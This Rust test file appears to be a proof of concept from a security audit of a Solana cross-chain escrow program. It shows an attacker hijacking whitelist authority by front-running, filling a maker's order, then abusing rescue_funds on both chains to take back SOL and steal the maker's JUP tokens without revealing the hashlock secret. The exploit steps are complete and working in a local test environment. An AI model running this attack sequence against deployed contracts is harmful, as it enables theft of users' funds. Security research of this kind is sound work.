use anchor_spl::token::spl_token::native_mint::ID as NATIVE_MINT;
use common::constants::RESCUE_DELAY;
use common_tests::dst_program::DstProgram;
use common_tests::helpers::*;
use common_tests::src_program::{create_order, SrcProgram};
use common_tests::whitelist::{init_whitelist, register};
use solana_program_test::tokio;
use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer};
use test_context::{test_context, AsyncTestContext};

// ============================================================================
// SKENARIO 1: Realistic End-to-End Cross-Chain Exit Scam
// ============================================================================
#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
#[tokio::test]
async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
    println!("\n=========================================");
    println!("=== SKENARIO 1: Realistic Cross-Chain Exit Scam ===");
    println!("=========================================");

    let mut dst_state = TestStateBase::<DstProgram, TokenSPL>::setup().await;

    // Sync secrets and hashlocks between the two chains
    src_state.secret = dst_state.secret;
    src_state.hashlock = dst_state.hashlock;

    // --- PHASE 1: NORMAL FLOW (Maker creates order BEFORE attack) ---
    println!("\n=== DAY 0: Normal Flow - Maker locks funds ===");
    
    src_state.test_arguments.asset_is_native = false;
    src_state.test_arguments.order_amount = 100_000_000; // 100 JUP
    src_state.test_arguments.escrow_amount = 100_000_000;
    
    // Maker creates order on Source Chain. At this point, whitelist might not even be initialized yet!
    let (_order_a, _order_ata_a) = create_order(src_state).await;
    
    // Sync order_hash to dst_state so the Attacker can use it on Chain B
    dst_state.order_hash = src_state.order_hash;

    let maker_initial_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_initial_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // FIX: Removed & from get_balance
    let attacker_initial_sol = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();

    println!("[CHAIN A] Maker locked 100 JUP in Order.");
    println!("[BEFORE] Maker JUP balance: {}", maker_initial_jup);
    println!("[BEFORE] Attacker (Taker) JUP balance: {}", attacker_initial_jup);
    println!("[BEFORE] Attacker (Maker DST) SOL balance: {}", attacker_initial_sol);

    // --- PHASE 2: THE INTERCEPTION (Attacker Front-runs Whitelist Initialize) ---
    println!("\n=== PHASE 2: Interception - Attacker front-runs Whitelist initialization ===");
    
    // In reality: 1inch deploys program -> Attacker bot sees it -> Attacker sends init tx with high priority fee.
    // We simulate this by setting the attacker (taker_wallet) as the authority BEFORE init_whitelist is called.
    // The taker_wallet in src_state will act as our Attacker.
    src_state.authority_whitelist_kp = src_state.taker_wallet.keypair.insecure_clone();
    
    let _whitelist_state = init_whitelist(src_state).await; // Attacker wins the race!
    println!("[ATTACK] Attacker successfully hijacked Whitelist Authority.");

    // --- PHASE 3: ATTACKER BECOMES RESOLVER & FILLS ORDER ---
    println!("\n=== PHASE 3: Attacker registers as Resolver and fills Maker's order ===");
    
    // Attacker registers their wallet (taker_wallet) as a Resolver for SRC program
    register(src_state, cross_chain_escrow_src::ID, src_state.taker_wallet.keypair.pubkey()).await;
    println!("[ATTACK] Attacker registered as Resolver for SRC chain.");

    // Attacker (acting as Taker) fills the order on SRC. 100 JUP moves to escrow_ata.
    let (escrow_a, escrow_ata_a) = create_escrow(src_state).await;
    println!("[CHAIN A] Attacker filled order. 100 JUP moved to EscrowSrc.");

    // Attacker creates DST Escrow (Chain B) with 5 SOL
    dst_state.token = NATIVE_MINT;
    dst_state.test_arguments.asset_is_native = true;
    dst_state.test_arguments.escrow_amount = 5 * LAMPORTS_PER_SOL;
    dst_state.test_arguments.order_amount = 5 * LAMPORTS_PER_SOL;
    
    // In DST, the creator is the Attacker (maker_wallet in dst_state)
    let (escrow_b, escrow_ata_b) = create_escrow(&mut dst_state).await;
    println!("[CHAIN B] Attacker locked 5 SOL in EscrowDst.");

    // --- PHASE 4: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
    println!("\n=== DAY 8: Attacker exploits rescue_funds ===");
    
    // Fast forward time by 8 days + 100 seconds
    set_time(&mut src_state.context, src_state.init_timestamp + RESCUE_DELAY + 100);
    set_time(&mut dst_state.context, dst_state.init_timestamp + RESCUE_DELAY + 100);

    // 4a: Attacker recovers SOL on DST via rescue_funds(0) due to missing sync_native
    println!("\n--- STEP 1: Attacker recovers SOL on Chain B ---");
    
    // FIX: Removed & from get_balance
    let attacker_sol_before_rescue = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    dst_state.test_arguments.rescue_amount = 0;
    let rescue_tx_dst = DstProgram::get_rescue_funds_tx(
        &dst_state,
        &escrow_b,
        &dst_state.token,
        &escrow_ata_b,
        &dst_state.maker_wallet.native_token_account, // Attacker's native ATA
    );
    dst_state.client.process_transaction(rescue_tx_dst).await.expect_success();

    // FIX: Removed & from get_balance
    let attacker_sol_after_rescue = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    let recovered_sol = attacker_sol_after_rescue - attacker_sol_before_rescue;
    
    println!("[CHAIN B] Attacker recovered {} lamports ({} SOL) via rescue_funds(0)!", 
             recovered_sol, recovered_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[CHAIN B] EscrowB ATA is now closed. HTLC secret was NOT revealed.");

    // 4b: Attacker steals Maker's JUP on SRC via rescue_funds_for_escrow (NO SECRET NEEDED)
    println!("\n--- STEP 2: Attacker steals JUP on Chain A WITHOUT SECRET ---");
    
    let attacker_jup_before_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // We use rescue_funds_for_escrow instead of withdraw!
    // The bug in SRC routes the funds to taker_ata (Attacker) and only checks RESCUE_DELAY.
    src_state.test_arguments.rescue_amount = 100_000_000; // Steal all 100 JUP
    let rescue_tx_src = SrcProgram::get_rescue_funds_tx(
        src_state,
        &escrow_a,
        &src_state.token,
        &escrow_ata_a,
        &src_state.taker_wallet.token_account, // Funds routed to attacker (taker)
    );
    src_state.client.process_transaction(rescue_tx_src).await.expect_success();

    let attacker_jup_after_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let stolen_jup = attacker_jup_after_rescue - attacker_jup_before_rescue;
    
    println!("[CHAIN A] Attacker stole {} JUP via rescue_funds_for_escrow WITHOUT REVEALING THE SECRET!", stolen_jup);

    // --- PHASE 5: IMPACT ANALYSIS ---
    println!("\n=========================================");
    println!("=== CROSS-CHAIN PROFIT & LOSS ANALYSIS ===");
    println!("=========================================");
    
    let maker_final_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_final_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // FIX: Removed & from get_balance
    let attacker_final_sol = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    let net_sol_change = attacker_final_sol as i64 - attacker_initial_sol as i64;
    let net_jup_change = attacker_final_jup as i64 - attacker_initial_jup as i64;
    
    println!("[DST Chain] Attacker initial SOL: {} ({} SOL)", 
             attacker_initial_sol, attacker_initial_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[DST Chain] Attacker final SOL:   {} ({} SOL)", 
             attacker_final_sol, attacker_final_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[DST Chain] Net SOL change:       {} lamports (Recovered)", net_sol_change);
    println!();
    println!("[SRC Chain] Attacker initial JUP: {}", attacker_initial_jup);
    println!("[SRC Chain] Attacker final JUP:   {}", attacker_final_jup);
    println!("[SRC Chain] Net JUP change:       {} JUP (STOLEN)", net_jup_change);
    println!();
    println!("[VERDICT] Attacker sacrificed ~{} SOL in fees/rent", 
             (-net_sol_change) as f64 / LAMPORTS_PER_SOL as f64);
    println!("[VERDICT] Attacker gained {} JUP on Source Chain", net_jup_change);
    println!("[VERDICT] This is a RISK-FREE THEFT: small fee loss >> massive token gain");

    println!("\n=========================================");
    println!("=== EXPLOIT SUMMARY & FINAL IMPACT ===");
    println!("=========================================");
    println!("[IMPACT] Maker LOST {} JUP on Chain A (stolen by Attacker).", stolen_jup);
    println!("[IMPACT] Maker CANNOT claim 5 SOL on Chain B (Escrow closed).");
    println!("[IMPACT] Attacker RECOVERED {} SOL on Chain B.", 
             recovered_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[IMPACT] Attacker STOLE {} JUP on Chain A.", stolen_jup);
    println!("[IMPACT] HTLC atomicity is COMPLETELY BROKEN - secret never revealed!");
    println!("=========================================\n");

    // Final Assertions
    assert!(recovered_sol > 0, "Attacker should have recovered SOL from DST");
    assert!(stolen_jup > 0, "Attacker should have stolen JUP from SRC");
    assert!(net_jup_change > 0, "Attacker net JUP profit should be positive");
    assert!(maker_final_jup < maker_initial_jup, "Maker should have lost JUP");
}
